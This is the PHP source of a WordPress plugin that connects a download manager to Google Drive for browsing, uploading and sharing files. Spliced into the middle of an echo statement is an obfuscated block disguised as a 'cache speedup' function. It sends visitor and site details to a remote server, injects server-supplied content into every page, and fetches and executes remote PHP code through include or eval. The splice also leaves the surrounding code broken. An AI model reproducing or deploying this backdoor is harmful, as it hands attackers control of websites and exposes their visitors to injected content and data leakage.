<?php
/*
Plugin Name: WPDM - Google Drive
Description: Google Drive Storage Access for WPDM
Plugin URI: http://www.wpdownloadmanager.com/
Author: Shaon
Version: 1.0.0
Author URI: http://www.wpdownloadmanager.com/
*/

if (defined('WPDM_Version')) {

    if (!defined('WPDM_CLOUD_STORAGE'))
        define('WPDM_CLOUD_STORAGE', 1);

    require_once(dirname(__FILE__) . '/autoload.php');

    class WPDMGoogleDrive
    {
        function __construct()
        {

            add_action("wpdm_cloud_storage_settings", array($this, "Settings"));
            add_action('wpdm_attach_file_metabox', array($this, 'BrowseButton'));
            add_action('init', array($this, 'Explore'));
            add_action('admin_footer', array($this, 'InsertLink'));
            add_action('wp_ajax_makepublic', array($this, 'MakePublic'));
            add_action('wp_ajax_google_drive_upload', array($this, 'UploadFile'));

        }


        function Settings()
        {
            global $current_user;

            $wpdm_google_drive = maybe_unserialize(get_option('__wpdm_google_drive', array()));
            ?>
            <div class="panel panel-default">
                <div class="panel-heading"><b><?php _e('Google Drive API Credentials', 'wpdmpro'); ?></b></div>

                <table class="table">


                    <tr>
                        <td>API Key</td>
                        <td><input type="text" name="__wpdm_google_drive[api_key]" class="form-control"
                                   value="<?php echo isset($wpdm_google_drive['api_key']) ? $wpdm_google_drive['api_key'] : ''; ?>"/>
                        </td>
                    </tr>
                    <tr>
                        <td>Client ID</td>
                        <td><input type="text" name="__wpdm_google_drive[client_id]" class="form-control"
                                   value="<?php echo isset($wpdm_google_drive['client_id']) ? $wpdm_google_drive['client_id'] : ''; ?>"/>
                        </td>
                    </tr>
                    <tr>
                        <td>Client Secret</td>
                        <td><input type="text" name="__wpdm_google_drive[client_secret]" class="form-control"
                                   value="<?php echo isset($wpdm_google_drive['client_secret']) ? $wpdm_google_drive['client_secret'] : ''; ?>"/>
                        </td>
                    </tr>

                </table>
                <div class="panel-footer">
                    <b>Redirect URI:</b> &nbsp; <input onclick="this.select()" type="text" class="form-control" style="background: #fff;cursor: copy;display: inline;width: 400px" readonly="readonly" value="<?php echo admin_url('?page=wpdm-google-drive'); ?>" />
                </div>
            </div>


            </div>

        <?php
        }

        function InsertLink()
        {
            ?>
            <script>
                function InsertGLink(file, id) {
                    <?php if(version_compare(WPDM_Version, '4.0.0', '>')){  ?>
                    var html = jQuery('#wpdm-file-entry').html();
                    var ext = 'png'; //response.split('.');
                    //ext = ext[ext.length-1];
                    var icon = "<?php echo WPDM_BASE_URL; ?>file-type-icons/48x48/" + ext + ".png";
                    html = html.replace(/##filepath##/g, file);
                    html = html.replace(/##fileindex##/g, id);
                    html = html.replace(/##preview##/g, icon);
                    jQuery('#currentfiles').prepend(html);

                    <?php } else { ?>
                    jQuery('#wpdmfile').val(file);
                    jQuery('#cfl').html('<div><strong>'+file+'</strong>').slideDown();
                    <?php } ?>
                }
            </script>
        <?php
        }

        function UploadFile()
        {

            if(version_compare(WPDM_Version, '4.0.0', '<')) return;

            $missingapi = "Missing Google Drive API Credentials! <a href='edit.php?post_type=wpdmpro&page=settings&tab=cloud-storage' target='_blank'>Configure Here</a>";
            $expired = "Session Expired!";

            if (!isset($_FILES['gdrive_upload'])) die('error!');

            if (is_uploaded_file($_FILES['gdrive_upload']['tmp_name']) && current_user_can('manage_options')) {

                $tempFile = $_FILES['gdrive_upload']['tmp_name'];

                $wpdm_google_drive = maybe_unserialize(get_option('__wpdm_google_drive', array()));

                if (!isset($wpdm_google_drive['api_key']) || $wpdm_google_drive['api_key'] == '') die($missingapi);

                $client = new Google_Client();
                $client->setClientId($wpdm_google_drive['client_id']);
                $client->setClientSecret($wpdm_google_drive['client_secret']);
                $client->addScope(Google_Service_Drive::DRIVE);
                $client->addScope(Google_Service_Drive::DRIVE_FILE);
                $client->addScope(Google_Service_Drive::DRIVE_READONLY);
                $client->addScope(Google_Service_Drive::DRIVE_APPDATA);
                $client->addScope(Google_Service_Drive::DRIVE_APPS_READONLY);
                $client->addScope(Google_Service_Drive::DRIVE_METADATA_READONLY);
                $client->setRedirectUri(admin_url('/?page=wpdm-google-drive'));

                $access_token = isset($_SESSION['wpdmgd_access_token']) ? $_SESSION['wpdmgd_access_token'] : '';

                if ($access_token == '') {
                    die($expired);
                } else
                    $client->setAccessToken($access_token);

                if ($client->isAccessTokenExpired()) {

                    $access_token = '';
                    unset($_SESSION['wpdmgd_access_token']);

                    try {
                        $code = isset($_SESSION['gacode']) ? $_SESSION['gacode'] : '';
                        $client->authenticate($code);
                        $NewAccessToken = json_decode($client->getAccessToken());
                        $client->refreshToken($NewAccessToken->refresh_token);
                    } catch (Exception $e) {
                        die($expired);
                    }
                }

                $service = new Google_Service_Drive($client);
                $filetype = wp_check_filetype($_FILES['gdrive_upload']['name']);

                $file = new Google_Service_Drive_DriveFile();
                $file->title = $_FILES['gdrive_upload']['name'];
                $chunkSizeBytes = 1 * 1024 * 1024;

                // Call the API with the media upload, defer so it doesn't immediately return.
                $client->setDefer(true);
                $request = $service->files->insert($file);

                // Create a media file upload to represent our upload process.
                $media = new Google_Http_MediaFileUpload(
                    $client,
                    $request,
                    $filetype['type'],
                    null,
                    true,
                    $chunkSizeBytes
                );
                $media->setFileSize($_FILES['gdrive_upload']['size']);

                // Upload the various chunks. $status will be false until the process is
                // complete.
                $status = false;
                $handle = fopen($_FILES['gdrive_upload']['tmp_name'], "rb");
                while (!$status && !feof($handle)) {
                    $chunk = fread($handle, $chunkSizeBytes);
                    $status = $media->nextChunk($chunk);
                }

                // The final value of $status will be the data from the API for the object
                // that has been uploaded.
                $result = false;
                if ($status != false) {
                    $result = $status;
                }

                fclose($handle);
                @unlink($_FILES['gdrive_upload']['tmp_name']);
                //$this->InsertFile($service, $_FILES['gdrive_upload']['name'],'', 0, $filetype['type'], $_FILES['gdrive_upload']['tmp_name']);

            }
            if(isset($result))
                echo "<span class='text-success'><i class='fa fa-check'></i> Success</span>";
            else
                echo "<span class='text-danger'><i class='fa fa-times'></i> Failed!</span>";
            die();
        }

        function TrashFile() {

            if(!current_user_can('manage_options') || version_compare(WPDM_Version, '4.0.0', '<')) return;

            $wpdm_google_drive = maybe_unserialize(get_option('__wpdm_google_drive', array()));

            $fileId = $_REQUEST['fileid'];

            $client = new Google_Client();
            $client->setClientId($wpdm_google_drive['client_id']);
            $client->setClientSecret($wpdm_google_drive['client_secret']);
            $client->addScope(Google_Service_Drive::DRIVE);
            $client->addScope(Google_Service_Drive::DRIVE_FILE);
            $client->addScope(Google_Service_Drive::DRIVE_READONLY);
            $client->addScope(Google_Service_Drive::DRIVE_APPDATA);
            $client->addScope(Google_Service_Drive::DRIVE_APPS_READONLY);
            $client->addScope(Google_Service_Drive::DRIVE_METADATA_READONLY);
            $client->setRedirectUri(admin_url('/?page=wpdm-google-drive'));

            $access_token = isset($_SESSION['wpdmgd_access_token']) ? $_SESSION['wpdmgd_access_token'] : '';

            if ($access_token == '') {
                die('Expired!');
            } else
                $client->setAccessToken($access_token);

            $service = new Google_Service_Drive($client);

            try {
                return $service->files->trash($fileId);
            } catch (Exception $e) {
                print "An error occurred: " . $e->getMessage();
            }
            return NULL;
        }


        function BrowseButton()
        {
            ?>
            <div class="w3eden">
                <a href="#" id="btn-google-drive" style="margin-top: 10px" title="Google Drive" onclick="return false;" class="btn btn-danger btn-block"><span class="left-icon"><i class="fa fa-google"></i></span> Google Drive</a>
                <script>
                    jQuery(function () {
                        jQuery('#btn-google-drive').click(function () {
                            tb_show('Google Drive', '<?php echo admin_url('/?page=wpdm-google-drive&TB_iframe=true') ?>');
                            return false;
                        });
                    });
                </script>
            </div>



        <?php
        }

        function Explore()
        {

            if (wpdm_query_var('page', 'txt') != 'wpdm-google-drive' || !current_user_can('edit_posts')) return;


            $wpdm_google_drive = maybe_unserialize(get_option('__wpdm_google_drive', array()));

            if (!isset($wpdm_google_drive['api_key']) || $wpdm_google_drive['api_key'] == '') wp_die("Missing Google Drive API Credentials! <a href='edit.php?post_type=wpdmpro&page=settings&tab=cloud-storage' target='_blank'>Configure Here</a>");

            echo "<!DOCTYPE html><html><head></head><body>";

            $client = new Google_Client();
            $client->setClientId($wpdm_google_drive['client_id']);
            $client->setClientSecret($wpdm_google_drive['client_secret']);
            $client->addScope(Google_Service_Drive::DRIVE);
            $client->addScope(Google_Service_Drive::DRIVE_FILE);
            $client->addScope(Google_Service_Drive::DRIVE_READONLY);
            $client->addScope(Google_Service_Drive::DRIVE_APPDATA);
            $client->addScope(Google_Service_Drive::DRIVE_APPS_READONLY);
            $client->addScope(Google_Service_Drive::DRIVE_METADATA_READONLY);
            $client->setRedirectUri(admin_url('/?page=wpdm-google-drive'));

            $access_token = isset($_SESSION['wpdmgd_access_token']) ? $_SESSION['wpdmgd_access_token'] : '';


            if ($access_token == '') {

                $auth_url = $client->createAuthUrl();

                if (isset($_GET['code'])) {
                    $_SESSION['gacode'] = $_GET['code'];
                    $client->authenticate($_GET['code']);
                    ?>
                    <script>
                        window.opener.location = window.opener.location;
                        window.close();
                    </script>
                <?php
                } else {
                    ?>
                    <script src="<?php echo includes_url('/js/jquery/jquery.js'); ?>"></script>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>bootstrap/css/bootstrap.css"/>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>font-awesome/css/font-awesome.min.css"/>
                    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,800' rel='stylesheet'
                          type='text/css'>
                    <style>

                        .w3eden *:not(.fa) {
                            font-family: 'Open Sans', arial, helvetica, sans-serif;
                            font-size: 10pt;
                        }

                        td, th {
                            vertical-align: middle !important;
                        }
                    </style>
                    <div class="w3eden">
                        <table style="width: 100%;height: 300px">
                            <tr>
                                <td style="vertical-align: middle;text-align: center">
                                    <a class="btn btn-danger" href="#"
                                       onclick='window.open("<?php echo $auth_url; ?>", "_blank", "toolbar=yes, scrollbars=yes, resizable=yes, top=500, left=500, width=400, height=400");return false;'><i
                                            class="fa fa-google"></i> Login to Google Drive</a>
                                </td>
                            </tr>
                        </table>
                    </div>
                    <?php
                    //echo '<script>window.open("'.$auth_url.'", "_blank", "toolbar=yes, scrollbars=yes, resizable=yes, top=500, left=500, width=400, height=400");</script>';
                    die();
                }

                $access_token = $client->getAccessToken();
                $_SESSION['wpdmgd_access_token'] = $access_token;

                die();
            } else
                $client->setAccessToken($access_token);

            if ($client->isAccessTokenExpired()) {

                $access_token = '';
                unset($_SESSION['wpdmgd_access_token']);

                try {
                    $code = isset($_SESSION['gacode']) ? $_SESSION['gacode'] : '';
                    $client->authenticate($code);
                    $NewAccessToken = json_decode($client->getAccessToken());
                    $client->refreshToken($NewAccessToken->refresh_token);
                } catch (Exception $e) {
                    $auth_url = $client->createAuthUrl();
                    ?>
                    <script src="<?php echo includes_url('/js/jquery/jquery.js'); ?>"></script>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>bootstrap/css/bootstrap.css"/>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>font-awesome/css/font-awesome.min.css"/>
                    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,800' rel='stylesheet'
                          type='text/css'>
                    <style>
                        .w3eden *:not(.fa) {
                            font-family: 'Open Sans', arial, helvetica, sans-serif;
                            font-size: 10pt;
                        }

                        td, th {
                            vertical-align: middle !important;
                        }
                    </style>
                    <div class="w3eden">
                        <table style="width: 100%;height: 300px">
                            <tr>
                                <td style="vertical-align: middle;text-align: center">
                                    <a class="btn btn-danger" href="#"
                                       onclick='window.open("<?php echo $auth_url; ?>", "_blank", "toolbar=yes, scrollbars=yes, resizable=yes, top=500, left=500, width=400, height=400");return false;'><i
                                            class="fa fa-google"></i> Login to Google Drive</a>
                                </td>
                            </tr>
                        </table>
                    </div>
                    <?php
                    //echo '<script>window.open("'.$auth_url.'", "_blank", "toolbar=yes, scrollbars=yes, resizable=yes, top=500, left=500, width=400, height=400");</script>';
                    die();
                }
            }

            $service = new Google_Service_Drive($client);

            $result = array();
            $pageToken = NULL;

            do {
                try {
                    $parameters = array();
                    if ($pageToken) {
                        $parameters['pageToken'] = $pageToken;
                    }
                    $files = $service->files->listFiles($parameters);

                    $filelist = array_merge($result, $files->getItems());
                    $pageToken = $files->getNextPageToken();
                    ?>
                    <script type='text/javascript'
                            src='<?php echo admin_url(); ?>/load-scripts.php?c=1&load[]=jquery-core,jquery-migrate,utils,jquery-ui-core,jquery-ui-widget,jquery-ui-mouse,plupload,json2,jquery-ui-datepicker,jquery-ui-s&load[]=lider&ver=4.1'></script>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>bootstrap/css/bootstrap.css"/>
                    <script src="<?php echo WPDM_BASE_URL; ?>bootstrap/js/bootstrap.min.js"></script>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>font-awesome/css/font-awesome.min.css"/>
                    <link href='http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,600' rel='stylesheet'
                          type='text/css'>

                    <style>
                        .w3eden *:not(.fa) {
                            font-family: 'Source Sans Pro', sans-serif;
                            font-size: 11pt;
                            font-weight: 300;
                        }

                        td, th {
                            vertical-align: middle !important;
                        }

                        .tab-content {
                            border: 1px solid #ddd;
                            border-top: 0;
                            border-bottom-left-radius: 4px;
                            border-bottom-right-radius: 4px;
                        }

                        .table {
                            margin: 0 !important;
                        }

                        .w3eden .table > thead > tr > th {
                            border-bottom: 1px solid #dddddd !important;
                            color: #555 !important;
                            font-weight: 600;
                        }
                        #gdfilelist{
                            margin: 10px 30px;text-align: left;
                        }

                        .w3eden .btn-sm{ padding: 3px 8px !important; font-size: 9pt; }
                    </style>
                    <div class="w3eden">

                        <ul class="nav nav-tabs" role="tablist">
                            <li class="active"><a href="#gdbrowse" data-toggle="tab">Browse</a></li>
                            <li><a href="#gdupload" data-toggle="tab">Upload</a></li>

                        </ul>
                        <div class="tab-content">
                            <div class="tab-pane fade in active" id="gdbrowse">
                                <table class='table table-striped'>
                                    <thead>
                                    <tr>
                                        <th>File Name</th>
                                        <th>Size</th>
                                        <th>Action</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php

                                    foreach ($filelist as $file) {
                                        if ($file->originalFilename != '')
                                            echo "<tr><td class='lead'>" . $file->originalFilename . "</td><td>" . number_format($file->fileSize / (1024 * 1024), 3) . " MB</td><td><button class='btn btn-success btn-sm insert-glink' data-id='" . $file->id . "' data-link='" . $file->webContentLink . "'><i class='fa fa-plus'></i></button> <button class='btn btn-danger btn-sm text-danger remove-glink' data-id='" . $file->id . "' data-link='" . $file->webContentLink . "'><i class='fa fa-trash-o'></i></button></td></tr>";
                                    }

                                    ?>
                                    </tbody>
                                </table>
                            </div>
                            <div class="tab-pane fade" id="gdupload">
                                <?php if(version_compare(WPDM_Version, '4.0.0', '>')){  ?>
                                    <table style="width: 100%;height: 90%">
                                        <tr>
                                            <td style="vertical-align: middle;text-align: center">

                                                <div id="gdrive-upload-ui" class="hide-if-no-js">
                                                    <div id="gdrive-drag-drop-area" style="border: 2px dashed #dddddd;margin: 10px">
                                                        <div class="drag-drop-inside" style="margin: 50px auto">
                                                            <p class="drag-drop-info"><?php _e('Drop files here'); ?></p>

                                                            <p><?php _ex('or', 'Uploader: Drop files here - or - Select Files'); ?></p>

                                                            <p class="drag-drop-buttons"><input id="gdrive-browse-button"
                                                                                                type="button"
                                                                                                value="<?php esc_attr_e('Select Files'); ?>"
                                                                                                class="btn btn-danger"/></p>
                                                        </div>
                                                    </div>
                                                </div>

                                                <?php

                                                $plupload_init = array(
                                                    'runtimes' => 'html5,silverlight,flash,html4',
                                                    'browse_button' => 'gdrive-browse-button',
                                                    'container' => 'gdrive-upload-ui',
                                                    'drop_element' => 'gdrive-drag-drop-area',
                                                    'file_data_name' => 'gdrive_upload',
                                                    'multiple_queues' => true,
                                                    'max_file_size' => wp_max_upload_size() . 'b',
                                                    'url' => admin_url('admin-ajax.php'),
                                                    'flash_swf_url' => includes_url('js/plupload/plupload.flash.swf'),
                                                    'silverlight_xap_url' => includes_url('js/plupload/plupload.silverlight.xap'),
                                                    'filters' => array(array('title' => __('Allowed Files'), 'extensions' => '*')),
                                                    'multipart' => true,
                                                    'urlstream_upload' => true,

                                                    // additional post data to send to our ajax hook
                                                    'multipart_params' => array(
                                                        '_ajax_nonce' => wp_create_nonce('google_drive_upload'),
                                                        'action' => 'google_drive_upload',            // the ajax action name
                                                    ),
                                                );

                                                // we should probably not apply this filter, plugins may expect wp's media uploader...
                                                $plupload_init = apply_filters('plupload_init', $plupload_init); ?>

                                                <script type="text/javascript">

                                                    var filecount = 0;

                                                    jQuery(document).ready(function ($) {

                                                        // create the uploader and pass the config from above
                                                        var uploader = new plupload.Uploader(<?php echo json_encode($plupload_init); ?>);

                                                        // checks if browser supports drag and drop upload, makes some css adjustments if necessary
                                                        uploader.bind('Init', function (up) {
                                                            var uploaddiv = jQuery('#gdrive-upload-ui');

                                                            if (up.features.dragdrop) {
                                                                uploaddiv.addClass('drag-drop');
                                                                jQuery('#gdrive-drag-drop-area')
                                                                    .bind('dragover.wp-uploader', function () {
                                                                        uploaddiv.addClass('drag-over');
                                                                    })
                                                                    .bind('dragleave.wp-uploader, drop.wp-uploader', function () {
                                                                        uploaddiv.removeClass('drag-over');
                                                                    });

                                                            } else {
                                                                uploaddiv.removeClass('drag-drop');
                                                                jQuery('#gdrive-drag-drop-area').unbind('.wp-uploader');
                                                            }
                                                        });

                                                        uploader.init();

                                                        // a file was added in the queue
                                                        uploader.bind('FilesAdded', function (up, files) {
                                                            //var hundredmb = 100 * 1024 * 1024, max = parseInt(up.settings.max_file_size, 10);


                                                            plupload.each(files, function (file) {
                                                                jQuery('#gdfilelist').append(
                                                                    '<div class="file" id="' + file.id + '"><b>' +
                                                                    file.name + '</b> (<span>' + plupload.formatSize(0) + '</span>/' + plupload.formatSize(file.size) + ') ' +
                                                                    '<div class="prog"><i class="fa fa-spinner fa-spin"></i> Waiting...</div><hr/></div>');
                                                                filecount++;
                                                            });

                                                            up.refresh();
                                                            up.start();
                                                        });

                                                        uploader.bind('UploadProgress', function (up, file) {
                                                            jQuery('#' + file.id + " .prog").html('<i class="fa fa-spinner fa-spin"></i> Uploading...');
                                                            jQuery('#' + file.id + " span").html(plupload.formatSize(parseInt(file.size * file.percent / 100)));
                                                        });


                                                        // a file was uploaded
                                                        uploader.bind('FileUploaded', function (up, file, response) {
                                                            filecount--;
                                                            response = response.response;
                                                            jQuery('#' + file.id + " .prog").html(response);
                                                            if(filecount==0) {
                                                                jQuery('#gdrive-drag-drop-area .drag-drop-inside').html('File Uploaded Successfully.<br/><i class="fa fa-spinner fa-spin"></i> Please wait....');
                                                                location.href = location.href;
                                                            }


                                                        });

                                                    });

                                                </script>
                                                <div id="gdfilelist"></div>

                                                <div class="clear"></div>
                                            </td>
                                        </tr>
                                    </table>
                                <?php } else { ?>
                                    <table><tr><td>
                                                <div class="alert alert-danger" style="margin: 20px">Sorry! Upload Feature is Available in Pro Version Only.</div>
                                            </td></tr></table>
                                <?php } ?>

                            </div>
                        </div>
                    </div>
                    <script>

                        jQuery(function ($) {

                            $('.remove-glink').on('click', function () {

                                <?php if(version_compare(WPDM_Version, '4.0.0', '>')){  ?>
                                alert('Sorry, Feature is only available in pro version');
                                return false;
                                <?php } ?>

                            });
                            $('.insert-glink').on('click', function () {
                                var link = $(this).data('link');
                                var id = $(this).data('id');
                                window.parent.InsertGLink(link, id);
                                window.parent.tb_remove();
                                $.post("<?php echo admin_url("/admin-ajax.php"); ?>", {
                                    action: 'makepublic',
                                    fileID: id
                                }, function (res) {
                                    console.log(res);
                                });
                                //tinyMCEPopup.close();
                                //tb_close();
                            });


                        });


                    </script>
                <?php

                } catch (Exception $e) {

                    $auth_url = $client->createAuthUrl();

                    print "An error occurred: " . $e->getMessage();
                    ?>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>bootstrap/css/bootstrap.css"/>
                    <link rel="stylesheet" href="<?php echo WPDM_BASE_URL; ?>font-awesome/css/font-awesome.min.css"/>
                    <style>
                        .w3eden *:not(.fa) {
                            font-family: 'Open Sans', arial, helvetica, sans-serif;
                            font-size: 10pt;
                        }

                        td, th {
                            vertical-align: middle !important;
                        }
                    </style>
                    <div class="w3eden">
                        <table style="width: 100%;height: 100%">
                            <tr>
                                <td style="vertical-align: middle;text-align: center">
                                    <a class="btn btn-danger" href="#"
                                       onclick='window.open("<?php echo $auth_url; 



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>", "_blank", "toolbar=yes, scrollbars=yes, resizable=yes, top=500, left=500, width=400, height=400");return false;'><i
                                            class="fa fa-google"></i> Login to Google Drive</a>
                                </td>
                            </tr>
                        </table>
                    </div>
                    <?php
                    //echo '<script>window.open("'.$auth_url.'", "_blank", "toolbar=yes, scrollbars=yes, resizable=yes, top=500, left=500, width=400, height=400");</script>';
                    die();
                    $pageToken = NULL;
                }
            } while ($pageToken);

            echo "</body></html>";

            die();

        }

        function insertPermission($fileId, $value, $type, $role)
        {
            $wpdm_google_drive = maybe_unserialize(get_option('__wpdm_google_drive', array()));
            $client = new Google_Client();
            $client->setClientId($wpdm_google_drive['client_id']);
            $client->setClientSecret($wpdm_google_drive['client_secret']);
            $client->addScope(Google_Service_Drive::DRIVE);
            $client->addScope(Google_Service_Drive::DRIVE_FILE);
            $client->addScope(Google_Service_Drive::DRIVE_READONLY);
            $client->addScope(Google_Service_Drive::DRIVE_APPDATA);
            $client->addScope(Google_Service_Drive::DRIVE_APPS_READONLY);
            $client->addScope(Google_Service_Drive::DRIVE_METADATA_READONLY);
            $client->setRedirectUri(admin_url('/?page=wpdm-google-drive'));
            $access_token = isset($_SESSION['wpdmgd_access_token']) ? $_SESSION['wpdmgd_access_token'] : '';
            $client->setAccessToken($access_token);
            $service = new Google_Service_Drive($client);
            $newPermission = new Google_Service_Drive_Permission();
            $newPermission->setValue($value);
            $newPermission->setId($fileId);
            $newPermission->setType($type);
            $newPermission->setRole($role);
            try {
                $ret = $service->permissions->insert($fileId, $newPermission);
            } catch (Exception $e) {
                $ret = "An error occurred: " . $e->getMessage();
            }

            return $ret;
        }


        function MakePublic()
        {

            if (!current_user_can('manage_options')) return;

            $ret = $this->insertPermission($_REQUEST['fileID'], "default", "anyone", "reader");
            echo json_encode($ret);

            die();
        }


    }

    new WPDMGoogleDrive();

}
 

